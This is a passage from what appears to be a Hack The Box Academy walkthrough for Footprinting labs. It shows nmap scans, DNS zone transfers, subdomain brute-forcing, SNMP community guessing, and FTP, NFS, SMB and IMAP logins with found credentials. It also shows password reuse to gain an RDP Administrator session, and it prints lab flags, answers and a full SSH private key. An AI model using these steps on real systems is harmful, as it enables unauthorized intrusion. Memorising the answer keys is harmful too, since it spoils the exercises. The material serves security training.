PORT     STATE SERVICE VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.141.200]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Ceil's FTP) [10.129.141.200]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
```

Students will notice that there is a DNS server running, therefore, they need to attempt a zone transfer with `dig`:

Code: shell

```shell
dig AXFR inlanefreight.htb @STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ dig AXFR inlanefreight.htb @10.129.85.254

; <<>> DiG 9.16.27-Debian <<>> AXFR inlanefreight.htb @10.129.85.254
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.18.15
internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
ns.inlanefreight.htb.	604800	IN	A	10.129.34.136
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 10 msec
;; SERVER: 10.129.85.254#53(10.129.85.254)
;; WHEN: Mon Nov 28 10:25:21 GMT 2022
;; XFR size: 10 records (messages 1, bytes 540)
```

The one that stands out is `internal.inlanefreight.htb`, therefore, students need to add it to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP internal.inlanefreight.htb" >> /etc/hosts'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.85.254 internal.inlanefreight.htb" >> /etc/hosts'
```

Subsequently, students need to run `dnsenum` on `internal.inlanefreight.htb`, finding the subdomain `ftp.internal.inlanefreight.htb`:

Code: shell

```shell
dnsenum --dnsserver STMIP --enum -p 0 -s 0 -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt internal.inlanefreight.htb
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ dnsenum --dnsserver 10.129.85.254 --enum -p 0 -s 0 -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt internal.inlanefreight.htb
dnsenum VERSION:1.2.6

-----   internal.inlanefreight.htb   -----

Host's addresses:
__________________

Name Servers:
______________

ns.inlanefreight.htb.   604800   IN    A   10.129.34.136

Mail (MX) Servers:
___________________

Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 2.

Trying Zone Transfer for internal.inlanefreight.htb on ns.inlanefreight.htb ... 
AXFR record query failed: no nameservers


Brute forcing with /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:
_______________________________________________________________________________________

ftp.internal.inlanefreight.htb.          604800   IN    A         127.0.0.1
ns.internal.inlanefreight.htb.           604800   IN    A        10.129.34.13
<SNIP>
```

Thus, students need to add `ftp.internal.inlanefreight.htb` to `/etc/hosts` and then launch an `Nmap` scan against it:

Code: shell

```shell
sudo sh -c 'echo "STMIP ftp.internal.inlanefreight.htb" >> /etc/hosts'
nmap -T4 ftp.internal.inlanefreight.htb
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.85.254 ftp.internal.inlanefreight.htb" >> /etc/hosts'
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~/ipmiPwner]
└──╼ [★]$ nmap -T4 ftp.internal.inlanefreight.htb

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-28 10:32 GMT
Nmap scan report for ftp.internal.inlanefreight.htb (10.129.85.254)
Host is up (0.067s latency).
rDNS record for 10.129.85.254: internal.inlanefreight.htb
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
2121/tcp open  ccproxy-ftp
```

From the output of `Nmap`, students will know that there is a FTP protocol/service running on a `CCProxy` server utilizing port 2121.

Students need to recall the details written in the assessment's lab scenario. Specifically, that the credentials `ceil:qwer1234` had already been discovered. Therefore, students need to utilize them to connect to the FTP service on port 2121:

Code: shell

```shell
ftp ftp.internal.inlanefreight.htb 2121
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~/ipmiPwner]
└──╼ [★]$ ftp ftp.internal.inlanefreight.htb 2121

Connected to ftp.internal.inlanefreight.htb.
220 ProFTPD Server (Ceil's FTP) [10.129.85.254]
Name (ftp.internal.inlanefreight.htb:root): ceil
331 Password required for ceil
Password:
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
```

When listing the hidden contents of the directory, students will find a `.ssh` folder, which contains within it an SSH private key named `id_rsa`, therefore, students need to use `get` to download it:

Code: shell

```shell
ls -al
ls .ssh/
cd .ssh
get id_rsa
```

```shell-session
ftp> ls -al

200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp> ls .ssh/
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
ftp> cd .ssh
250 CWD command successful
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
226 Transfer complete
3381 bytes received in 0.00 secs (2.6408 MB/s)
```

Subsequently, students need to set the permissions `600` to the private key before using it:

Code: shell

```shell
chmod 600 id_rsa
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~/ipmiPwner]
└──╼ [★]$ chmod 600 id_rsa
```

At last, students need to use the private key to connect to the SSH service on the spawned target machine as the user `ceil` and print out the flag file at `/home/flag/flag.txt` to attain `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`:

Code: shell

```shell
ssh -i id_rsa ceil@STMIP
cat /home/flag/flag.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~/ipmiPwner]
└──╼ [★]$ ssh -i id_rsa ceil@10.129.85.254

The authenticity of host '10.129.85.254 (10.129.85.254)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.85.254' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
<SNIP>

ceil@NIXEASY:~$ cat /home/flag/flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

Answer: `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`

# Footprinting Lab - Medium

## Question 1

### "Enumerate the server carefully and find the username "HTB" and its password. Then, submit his password as the answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
sudo nmap -A STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ sudo nmap -A 10.129.202.41

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-28 11:11 GMT
Nmap scan report for 10.129.202.41
Host is up (0.011s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-28T11:12:11+00:00
|_ssl-date: 2022-11-28T11:12:19+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2022-11-27T11:08:35
|_Not valid after:  2023-05-29T11:08:35

<SNIP>

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-28T11:12:13
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

Students will notice that the NFS ports 111 and 2049 are open, therefore, they need to use `showmount` to list the available NFS shares on the spawned target:

Code: shell

```shell
showmount -e STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ showmount -e 10.129.202.41

Export list for 10.129.202.41:
/TechSupport (everyone)
```

The only share that exists is `/TechSupport`, therefore, students need to mount it locally:

Code: shell

```shell
sudo mkdir NFS && sudo mount -t nfs STMIP:/TechSupport ./NFS
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ sudo mkdir NFS && sudo mount -t nfs 10.129.202.41:/TechSupport ./NFS
```

When viewing the data size of the files within the share, students will find out that all of them are empty except for "ticket4238791283782.txt":

Code: shell

```shell
sudo ls -lA NFS/
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ sudo ls -lA NFS/

total 4
-rwx------ 1 nobody 4294967294    0 Nov 10  2021 ticket4238791283649.txt
-rwx------ 1 nobody 4294967294    0 Nov 10  2021 ticket4238791283650.txt
-rwx------ 1 nobody 4294967294    0 Nov 10  2021 ticket4238791283651.txt
<SNIP>
-rwx------ 1 nobody 4294967294 1305 Nov 10  2021 ticket4238791283782.txt
<SNIP>
```

When viewing the contents of the file, students will attain the credentials `alex:lol123!mD`

Code: shell

```shell
sudo cat NFS/ticket4238791283782.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ sudo cat NFS/ticket4238791283782.txt

Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
<SNIP>
```

Subsequently, students need to utilize the credentials `alex:lol123!mD` to list the shares as the user `alex`:

Code: shell

```shell
smbclient -L //STMIP -U alex
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ smbclient -L //10.129.202.41 -U alex

Enter WORKGROUP\alex's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	devshare        Disk      
	IPC$            IPC       Remote IPC
	Users           Disk      
SMB1 disabled -- no workgroup available
```

Students need to connect to `devshare`, to find the file "important.txt" which they need to `get`:

Code: shell

```shell
smbclient //STMIP/devshare -U alex
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ smbclient //10.129.202.41/devshare -U alex

Enter WORKGROUP\alex's password: 
Try "help" to get a list of possible commands.
smb: \> get important.txt 
getting file \important.txt of size 16 as important.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

Reading "important.txt", students will find what seems to be a Windows credentials `sa:87N1ns@slls83`:

Code: shell

```shell
awk 1 important.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ awk 1 important.txt

sa:87N1ns@slls83
```

Therefore, students need to test for the security misconfiguration of password reuse and use the credentials `Administrator:87N1ns@slls83` to connect over RDP to the spawned target:

```shell
xfreerdp /v:STMIP /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution

[13:18:01:895] [9814:9815] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

This may indicate that the certificate has been tampered with.
Please contact the administrator of the RDP server and clarify.
Do you trust the above certificate? (Y/T/N) Y
```

Once the RDP session has been established successfully, students need to open `Microsoft SQL Server Management Studio 18`:

![Footprinting_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/48/Footprinting_Walkthrough_Image_1.png)

![Footprinting_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/48/Footprinting_Walkthrough_Image_2.png)

After connecting to the SQL instance, students need to write a new query that retrieves all the columns from the `devsacc` table of the user `HTB`, finding the password `lnch7ehrdn43i7AoqVPK4zWR`:

```sql
SELECT * FROM devsacc WHERE name='HTB'
```

![Footprinting_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/48/Footprinting_Walkthrough_Image_3.png)

Answer: `lnch7ehrdn43i7AoqVPK4zWR`

# Footprinting Lab - Hard

## Question 1

### "Enumerate the server carefully and find the username "HTB" and its password. Then, submit his password as the answer."

After spawning the target machine, students need to run an `Nmap` scan against the UDP ports 161,22,110,143,993,995 only:

```shell
sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-tphppderas]─[~]
└──╼ [★]$ sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 10.129.78.175

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-28 22:53 GMT
Nmap scan report for 10.129.78.175
Host is up (0.073s latency).

PORT    STATE  SERVICE VERSION
22/udp  closed ssh
110/udp closed pop3
143/udp closed imap
161/udp open   snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 10
|_  snmpEngineTime: 25m10s
993/udp closed imaps
995/udp closed pop3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Subsequently, students need to utilize `onesixtyone` to bruteforce the names of the community string, to find it to be `backup`:

```shell
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp-onesixtyone.txt STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-tphppderas]─[~]
└──╼ [★]$ onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.78.175

Scanning 1 hosts, 3219 communities
10.129.78.175 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

With the attained community string, students need to use `Snmpwalk` to query the `OIDs` with their information, finding the credentials `tom:NMds732Js2761`:

```shell
snmpwalk -v2c -c backup STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-tphppderas]─[~]
└──╼ [★]$ snmpwalk -v2c -c backup 10.129.78.175

iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
<SNIP>
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Thereafter, students need to connect to `IMAP` using `openssl`:

```shell
openssl s_client -connect STMIP:imaps
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-tphppderas]─[~]
└──╼ [★]$ openssl s_client -connect 10.129.78.175:imaps

CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = NIXHARD
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = NIXHARD
verify return:1
---
Certificate chain
 0 s:CN = NIXHARD
   i:CN = NIXHARD
<SNIP>
```

Subsequently, students need to utilize the credentials `tom:NMds732Js2761` to login. Then, students need to select `INBOX` and fetch the only email in there, exposing a SSH private key:

```shell
1337 login tom NMds732Js2761
1337 list "" *
1337 select "INBOX"
1337 fetch 1 (body[])
```

```shell-session
1337 login tom NMds732Js2761

1337 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
1337 list "" *
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
1337 OK List completed (0.057 + 0.000 + 0.056 secs).
1337 select "INBOX"
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
1337 OK [READ-WRITE] Select completed (0.003 + 0.000 + 0.002 secs).
1337 fetch 1 (body[])
* 1 FETCH (BODY[] {3661}
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
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
